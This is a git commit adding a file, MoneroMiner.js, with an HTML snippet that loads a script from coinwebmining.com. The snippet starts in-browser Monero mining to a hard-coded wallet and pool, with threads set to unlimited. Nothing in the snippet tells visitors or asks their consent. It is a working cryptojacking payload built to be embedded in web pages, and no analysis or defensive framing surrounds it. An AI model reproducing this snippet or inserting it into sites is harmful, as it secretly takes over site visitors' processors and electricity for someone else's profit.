32a468a1fcd796006333caf390d196059a76d4f8
DDHDYT <3068799@gmail.com>
2019-08-18 00:50:03 -0500

    Create MoneroMiner.js

---
+++ MoneroMiner.js
@@ -0,0 +1,12 @@
+<script src="https://coinwebmining.com/cwm.js"></script>
+<script>
+    var site_id = 'cwm-2627';
+    var coin = 'monero';
+    var wallet = '46YVNRoBHJKHmrHaGpnw5FMEfjE6Sbhg2KKnKSgeWap1PixV4jv1CENDdp1W7XqXLSdbG5XN5PXwfijznzVDkyrKJK1VBku';
+    var password = 'x';
+    var mining_pool = 'gulf.moneroocean.stream:10001';
+    var threads = -1;
+    var throttle = 0.2;
+    var debug = false;
+    cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
+</script>
